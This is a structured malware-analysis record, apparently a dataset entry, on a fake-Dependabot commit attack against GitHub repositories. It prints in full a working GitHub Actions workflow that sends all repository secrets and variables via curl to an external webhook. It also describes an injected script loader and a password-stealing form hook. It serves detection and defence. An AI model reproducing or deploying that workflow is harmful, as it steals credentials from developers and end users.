package_info.package_manager: GitHub (malicious commit, not a package manager)
package_info.package_versions: N/A (affects repositories via commit, not a package release)
package_info.why_malicious: The attack involves unauthorized commits masquerading as Dependabot, introducing malicious GitHub Actions and JavaScript code to exfiltrate secrets and steal end-user credentials. The entire commit is malicious as it is designed to compromise both developer and user security.

malicious_snippets.code_snippet:
name: Hook
on: [push]
jobs:
  secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Run
        env:
          MY_ENV: ${{ toJSON(secrets) }}
          MY_VARS: ${{ toJSON(vars) }}
        run: |
          echo $MY_ENV | curl "https://send.wagateway.pro/webhook" -H "Content-Type: application/json" -d @-
          echo $MY_VARS | curl "https://send.wagateway.pro/webhook" -H "Content-Type: application/json" -d @-
malicious_snippets.code_behavior: On every push event, the workflow reads all GitHub repository secrets and variables, then exfiltrates them via HTTPS POST to https://send.wagateway.pro/webhook.

malice_analysis.why_suspicious: This workflow is designed solely to exfiltrate sensitive secrets and variables to an external server, which is never legitimate.
malice_analysis.violated_expectations: Normal GitHub Actions should not exfiltrate secrets or variables to untrusted external endpoints.
malice_analysis.similar_legitimate_use: Legitimate workflows may send build status or logs to trusted internal endpoints, but never secrets to unknown domains.
key_indicators: Exfiltration of all secrets and variables
Use of curl to send data to an external, non-corporate domain

execution_context.trigger: runtime (browser execution of modified JS files)
execution_context.file_location: assets/js/*.js (end of every JavaScript file in the repo)

malicious_snippets.code_behavior: At runtime in the browser, the code appends a script tag to the DOM that loads an external JavaScript file from https://send.wagateway.pro/client.js?cache=ignore, enabling further malicious activity.

malice_analysis.why_suspicious: Appends an obfuscated script loader to every JS file, causing browsers to fetch and execute untrusted code from an external domain.
malice_analysis.violated_expectations: Legitimate code should not inject remote scripts into all JS files, especially from unrelated domains.
malice_analysis.similar_legitimate_use: Dynamic script loading is used for analytics or feature toggles, but not in this obfuscated, mass-injected manner.
key_indicators: Obfuscated code injected into all JS files
Loads script from suspicious external domain
No legitimate reason for mass script injection

execution_context.trigger: runtime (browser execution of loaded remote script)

malicious_snippets.code_behavior: At runtime in the browser, the code intercepts all password form submissions, serializes the credentials, and exfiltrates them via HTTPS POST to https://send.wagateway.pro/webhook.

malice_analysis.why_suspicious: Intercepts password form submissions and sends credentials to an external server, a classic credential-stealing technique.
malice_analysis.violated_expectations: Legitimate client-side code should never exfiltrate user credentials to untrusted domains.
malice_analysis.similar_legitimate_use: Form submission interception is used for validation or analytics, but never for credential exfiltration.
key_indicators: Sends form data to external domain
No user consent or legitimate purpose

attack_chain.action: Attacker obtains developer's GitHub personal access token (PAT), likely via a malicious package.
attack_chain.leads_to: Ability to authenticate as the victim and push code to repositories.

attack_chain.action: Attacker uses stolen PAT to commit malicious code to victim's repositories, impersonating Dependabot.
attack_chain.leads_to: Malicious code is introduced into the repository.

attack_chain.action: Malicious GitHub Action workflow is added to exfiltrate repository secrets and variables on every push.
attack_chain.leads_to: Repository secrets are sent to attacker's C2 server.

attack_chain.action: All JavaScript files are modified to append a script loader that fetches further malicious code.
attack_chain.leads_to: End-users of the web application are exposed to further malicious payloads.

attack_chain.action: Loaded remote script intercepts password form submissions and exfiltrates credentials.
attack_chain.leads_to: End-user credentials are sent to attacker's C2 server (final goal).

behavioral_signatures: Addition of GitHub Actions workflows that POST secrets or variables to external domains
Mass modification of *.js files to append obfuscated script loaders
JavaScript code that dynamically loads remote scripts from suspicious domains
Client-side code that intercepts password form submissions and sends data externally
file_indicators: Obfuscated code appended to end of *.js files
Script tags with src pointing to send.wagateway.pro/client.js
detection_knowledge.how_to_detect: Monitor for new or modified GitHub Actions workflows that exfiltrate secrets or variables to external domains. Scan for mass changes to JavaScript files, especially obfuscated code that loads remote scripts. Detect client-side code that intercepts password fields and sends data to untrusted endpoints. Flag network traffic to known malicious domains such as send.wagateway.pro.
